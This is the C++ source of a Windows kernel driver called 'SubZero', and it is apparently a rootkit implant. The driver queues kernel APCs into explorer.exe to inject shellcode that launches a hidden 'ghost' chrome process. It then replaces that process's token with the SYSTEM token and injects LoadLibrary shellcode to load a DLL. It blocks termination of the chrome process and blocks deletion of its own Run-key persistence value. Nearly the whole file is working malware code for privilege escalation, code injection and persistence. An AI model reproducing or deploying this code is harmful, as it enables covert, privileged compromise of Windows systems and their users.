#include "pch.h"
#include "SubZero.h"

Globals g_Globals;
DRIVER_UNLOAD SubZeroUnload;
DRIVER_DISPATCH SubZeroCreateClose;
NTSTATUS OnRegistryNotify(PVOID CallbackContext, PVOID Argument1, PVOID Argument2);
OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create);
void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize);
bool FindProcessByName(CHAR* Name, PEPROCESS* Process);
bool QueueAPC(PKTHREAD thread, KPROCESSOR_MODE mode, PKNORMAL_ROUTINE apcFunction);
void ReplaceToken(PEPROCESS Process, PACCESS_TOKEN Token);

extern "C" NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
	KdPrint((DRIVER_PREFIX "[+] Driver was loaded\n"));

	UNICODE_STRING altitude = RTL_CONSTANT_STRING(L"12345.6171");

	// Build registration structures for shell Process' protection
	OB_OPERATION_REGISTRATION operations[] = {
		{
			PsProcessType,		        // object type
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreOpenProcess, nullptr	// pre, post
		}
	};
	OB_CALLBACK_REGISTRATION reg = {
		OB_FLT_REGISTRATION_VERSION,
		1,										// operation count
		altitude,		// altitude
		nullptr,							    // context
		operations
	};

	auto status = STATUS_SUCCESS;
	PDEVICE_OBJECT DeviceObject = nullptr;
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\" DRIVER_NAME);
	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\" DRIVER_NAME);
	bool symLinkCreated = false;

	do {
		status = ::IoCreateDevice(DriverObject, 0, &devName,
			FILE_DEVICE_UNKNOWN, 0, TRUE, &DeviceObject);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "[-] Failed to create device (status=0x%08X)\n",status));
			break;
		}
		DeviceObject->Flags |= DO_DIRECT_IO;

		status = ::IoCreateSymbolicLink(&symLink, &devName);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "[-] Failed to create sym link (status=0x%08X)\n",status));
			break;
		}
		symLinkCreated = true;

		// Register for object notifications
		status = ::ObRegisterCallbacks(&reg, &g_Globals.ObjectRegistrationHandle);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "[-] Failed to register object callbacks (status=0x%08X)\n", status));
			break;
		}

		status = ::CmRegisterCallbackEx(OnRegistryNotify, &altitude, DriverObject,
			nullptr, &g_Globals.RegistryRegistrationCookie, nullptr);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "failed to set registry callback (%08X)\n",
				status));
			break;
		}

		// Register for Thread notifications
		status = ::PsSetCreateThreadNotifyRoutine(OnThreadNotify);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "[-] Failed to set Thread callbacks (status=status=%08X)\n", status));
			break;
		}
	} while (false);
	
	if (!NT_SUCCESS(status)) {
		if (symLinkCreated)
			::IoDeleteSymbolicLink(&symLink);
		if (DeviceObject)
			::IoDeleteDevice(DeviceObject);
	}

	// Initialize RundownProtection for APCs
	::ExInitializeRundownProtection(&g_Globals.RundownProtection);

	// Search for explorer Process
	PEPROCESS explorerProcess;
	LARGE_INTEGER interval;
	interval.QuadPart = -50000000; // 5 Seconds / 100 nanoseconds - in RELATIVE time
	do {
		if (::FindProcessByName(PARENT_PROCESS_NAME, &explorerProcess)) {
			g_Globals.ExplorerPID = ::HandleToULong(::PsGetProcessId(explorerProcess));
			KdPrint((DRIVER_PREFIX "[+] explorer.exe found. PID: %d\n", g_Globals.ExplorerPID));
			//ChangeVadEntryProtection(explorerProcess, NULL, 0);
			break;
		}
		else { 
			KdPrint((DRIVER_PREFIX "[-] explorer.exe not found. Trying again in 5 seconds\n"));
			::KeDelayExecutionThread(KernelMode, false, &interval); }
	} while (true);

	//::InterlockedExchange((volatile LONG*)((uintptr_t)explorerProcess + 0x3e8) , 1);
	//KdPrint((DRIVER_PREFIX "[+] explorer.exe PID changed.")); 

	DriverObject->DriverUnload = SubZeroUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = SubZeroCreateClose;
	return status;
}

void SubZeroUnload(PDRIVER_OBJECT DriverObject) {
	// unregister Process & Thread notifications in case of an error
	::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
	::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);

	// unregister object & registry notifications
	::ObUnRegisterCallbacks(g_Globals.ObjectRegistrationHandle);
	::CmUnRegisterCallback(g_Globals.RegistryRegistrationCookie);

	// Wait for KAPC to finish in case of an error
	::ExWaitForRundownProtectionRelease(&g_Globals.RundownProtection);

	// Delete device
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\" DRIVER_NAME);
	::IoDeleteSymbolicLink(&symLink);
	::IoDeleteDevice(DriverObject->DeviceObject);

	KdPrint((DRIVER_PREFIX "[+] Driver unloaded successfully\n"));
}

NTSTATUS SubZeroCreateClose(PDEVICE_OBJECT, PIRP Irp) {
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, 0);
	return STATUS_SUCCESS;
}

NTSTATUS OnRegistryNotify(PVOID, PVOID Argument1, PVOID Argument2) {
	REG_DELETE_VALUE_KEY_INFORMATION* deleteValueInfo;
	PCUNICODE_STRING name;

	switch ((REG_NOTIFY_CLASS)(ULONG_PTR)Argument1) {
	case RegNtPreDeleteValueKey:

		deleteValueInfo = (REG_DELETE_VALUE_KEY_INFORMATION*)Argument2;			
		if (NT_SUCCESS(::CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteValueInfo->Object, nullptr, &name, 0))) {
			
			// filter out key deletions
			if (::wcsncmp(name->Buffer, REG_MACHINE REG_RUN_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_RUN_KEY_PATH) - 1) == 0) {

				// filter out value deletions
				if (::wcsncmp(deleteValueInfo->ValueName->Buffer, DRIVER_NAMEW, ARRAYSIZE(DRIVER_NAMEW) - 1) == 0) {
					KdPrint((DRIVER_PREFIX "[+] Registry value deletion attempt detected\n"));
					return STATUS_ACCESS_DENIED;
				}			
			}
		}
	}

	// No match found
	return STATUS_SUCCESS;
}

OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID, POB_PRE_OPERATION_INFORMATION Info) {
	if (Info->KernelHandle)
		return OB_PREOP_SUCCESS;

	auto process = (PEPROCESS)Info->Object;
	auto pid = ::HandleToULong(::PsGetProcessId(process));
	if (pid == g_Globals.ChromePID) {
		//  Remove terminate access
		Info->Parameters->CreateHandleInformation.DesiredAccess &=
			~PROCESS_TERMINATE;
	}
	return OB_PREOP_SUCCESS;
}

void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
	// Thread creation only
	if (!Create) return;

	PETHREAD thread;
	ULONG pid = ::HandleToULong(ProcessId);
	ULONG tid = ::HandleToULong(ThreadId);

	// Search for an explorer Thread
	if (pid == g_Globals.ExplorerPID) {

		// Check if a launcher Thread was already found
		if (g_Globals.ExplorerLauncherThreadID != 0) return;

		KdPrint((DRIVER_PREFIX "[+] explorer launcher Thread catched. TID: %d\n", tid));
		g_Globals.ExplorerLauncherThreadID = tid;

		// Register for Process notifications in order to catch the ghost chrome launch
		auto status = ::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "[-] Failed to register Process callback (status=0x%08X)\n", status));
			return;
		}

		// Queue APC for chrome creation
		if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) {
			::PsLookupThreadByThreadId(ThreadId, &thread);
			if (!QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID) { InjectUsermodeShellcodeAPC(LaunchChromeShellcode, sizeof(LaunchChromeShellcode)); }))
				::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		}
		else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
	}
	// Search for chrome's first Thread
	else if (pid == g_Globals.ChromePID) {

		// Check if the first Thread was already found
		if (g_Globals.ChromeFirstThreadID != 0) return;

		KdPrint((DRIVER_PREFIX "[+] chrome first Thread catched. TID: %d\n", tid));
		g_Globals.ChromeFirstThreadID = tid;

		// Queue APC for dll loading
		if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) {
			::PsLookupThreadByThreadId(ThreadId, &thread);

			
			if (!QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID) 
				{
					PEPROCESS Process;
					PACCESS_TOKEN Token;
				
					Process = PsGetCurrentProcess();			// Get current process (i.e. chrome.exe)
					Token = ::PsReferencePrimaryToken(Process); // Get the process token
					ReplaceToken(Process, Token);				// Replace the process token with system token
					::ObDereferenceObject(Token);				// Dereference the process token
					
					// Thread and Process creation notification callbacks are not needed anymore
					::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
					::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);

					// Now inject the shellcode
					InjectUsermodeShellcodeAPC(LoadLibraryShellcode, sizeof(LoadLibraryShellcode));
			}))
				::ExReleaseRundownProtection(&g_Globals.RundownProtection);			
		}
		else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
	}
}

void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
	// Process creation only
	if (!CreateInfo) return;

	auto pid = ::HandleToULong(ProcessId);
	if (g_Globals.ChromePID == 0) {

		// Search for our ghost chrome 
		if (::HandleToULong(CreateInfo->ParentProcessId) == g_Globals.ExplorerPID) {
			KdPrint((DRIVER_PREFIX "[+] Chrome.exe catched. PID: %d\n", pid));
			g_Globals.ChromePID = pid;
			return;
		}
	}
}

bool FindProcessByName(CHAR* Name, PEPROCESS* Process)
{
	PEPROCESS initialSystemProcess = PsInitialSystemProcess;
	PEPROCESS currentEntry = initialSystemProcess;

	CHAR imageName[30];

	do
	{
		RtlCopyMemory((PVOID)(&imageName), (PVOID)((uintptr_t)currentEntry + 0x450) /* EPROCESS->ImageFileName */, sizeof(imageName));

		//KdPrint((DRIVER_PREFIX "[*] %s\n", imageName));

		if (strstr(imageName, Name))
		{
			ULONG activeThreads;
			RtlCopyMemory((PVOID)&activeThreads, (PVOID)((uintptr_t)currentEntry + 0x498) /* EPROCESS->ActiveThreads */, sizeof(activeThreads));
			if (activeThreads)
			{
				*Process = currentEntry;
				//PLIST_ENTRY list = (PLIST_ENTRY)((uintptr_t)(currentEntry) + 0x488); // EPROCESS->ThreadListHead
				//*Thread = (PKTHREAD)((uintptr_t)list->Flink - 0x6b8); // Same as CONTAINING_RECORD macro
				return true;
			}
		}

		PLIST_ENTRY list = (PLIST_ENTRY)((uintptr_t)(currentEntry) + 0x2F0); // EPROCESS->ActiveProcessLinks
		currentEntry = (PEPROCESS)((uintptr_t)list->Flink - 0x2F0);  // Same as CONTAINING_RECORD macro

	} while (currentEntry != initialSystemProcess);

	return false;


}

bool QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFunction) {
	PKAPC apc = (KAPC*)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
	if (!apc) {
		KdPrint((DRIVER_PREFIX "[-] Error allocating KAPC structure\n"));
		return false;
	}

	::KeInitializeApc(
		apc,
		Thread,
		OriginalApcEnvironment,
		[](PKAPC apc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*) {::ExFreePoolWithTag(apc, DRIVER_TAG); }, // Kernel APC
		[](PKAPC apc) { ::ExFreePoolWithTag(apc, DRIVER_TAG); 
						::ExReleaseRundownProtection(&g_Globals.RundownProtection); }, // Rundown APC
		ApcFunction, // Normal APC
		Mode,
		nullptr
	);

	auto inserted = ::KeInsertQueueApc(
		apc,
		nullptr,
		nullptr,
		0
	);

	if (!inserted) {
		::ExFreePoolWithTag(apc, DRIVER_TAG);
		KdPrint((DRIVER_PREFIX "[-] Error inserting APC\n"));
		return false;
	}
	else { 
		KdPrint((DRIVER_PREFIX "[+] APC queued successfully\n")); 
		return true;
	}
}

void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize) {
	KdPrint((DRIVER_PREFIX "[+] InjectUsermodeShellcodeAPC invoked\n"));

	SIZE_T pageAlligndShellcodeSize = ShellcodeSize;
	HANDLE hProcess = ZwCurrentProcess();

	// Allocate Shellcode's memory
	void* address{};
	auto status = ::ZwAllocateVirtualMemory(
		hProcess,
		&address,
		0,
		&pageAlligndShellcodeSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READ
	);
	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "[-] ZwAllocateVirtualMemory failed (0x%08X)\n", status));
		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		return;
	}

	PMDL mdl;
	PVOID mappedAddress = nullptr;
	bool successfull = false;
	do
	{
		// Allocate MDL
		mdl = ::IoAllocateMdl(
			address,
			(ULONG)pageAlligndShellcodeSize,
			false,
			false,
			nullptr
		);
		if (!mdl) break;

		::MmProbeAndLockPages(
			mdl,
			KernelMode,
			IoReadAccess
		);

		// Lock to kernel memory
		mappedAddress = ::MmMapLockedPagesSpecifyCache(
			mdl,
			KernelMode,
			MmNonCached,
			nullptr,
			false,
			NormalPagePriority
		);
		if (!mappedAddress) break;

		// Change protection
		status = ::MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
		if (NT_SUCCESS(status))
			successfull = true;

	} while (false);

	if (!successfull) {
		if (mdl) {
			if (mappedAddress) {
				KdPrint((DRIVER_PREFIX "[-] Error protecting MDL pages\n"));
				::MmUnmapLockedPages(mappedAddress, mdl);
			}
			else KdPrint((DRIVER_PREFIX "[-] Error mapping MDL\n"));
			::MmUnlockPages(mdl);
			::IoFreeMdl(mdl);
		}
		else KdPrint((DRIVER_PREFIX "[-] Error allocating MDL\n"));
		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		return;
	}

	// Copy Shellcode
	if (int errorCode = ::memcpy_s(mappedAddress, ShellcodeSize, Shellcode, ShellcodeSize)) {
		KdPrint((DRIVER_PREFIX "[-] Error copying Shellcode to mapped address - (0x%p). Error code: (0x%08X)\n", mappedAddress, errorCode));
		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		return;
	}
	KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%p). Size: %d bytes\n", address, (int)ShellcodeSize));

	// Free MDL pages
	::MmUnmapLockedPages(mappedAddress, mdl);
	::MmUnlockPages(mdl);
	::IoFreeMdl(mdl);

	QueueAPC(::KeGetCurrentThread(), UserMode, reinterpret_cast<PKNORMAL_ROUTINE>(address));

	// Kernel APC finished - release RP
	::ExReleaseRundownProtection(&g_Globals.RundownProtection);
}

void ReplaceToken(PEPROCESS Process, PACCESS_TOKEN Token)
{
	PACCESS_TOKEN SystemToken = ::PsReferencePrimaryToken(PsInitialSystemProcess);
	PULONG_PTR ptr = (PULONG_PTR)Process;

	// Find the Token member in the EPROCESS structure
	for (ULONG i = 0; i < 512; i++)
	{
		if ((ptr[i] & ~7) == (ULONG_PTR)((ULONG_PTR)Token & ~7))
		{
			// Replace the original token with system token
			ptr[i] = (ULONG_PTR)SystemToken;
			break;
		}
	}
	// Dereference the system token
	::ObDereferenceObject(SystemToken);

	KdPrint((DRIVER_PREFIX "[+] Process token has changed successfully\n"));
}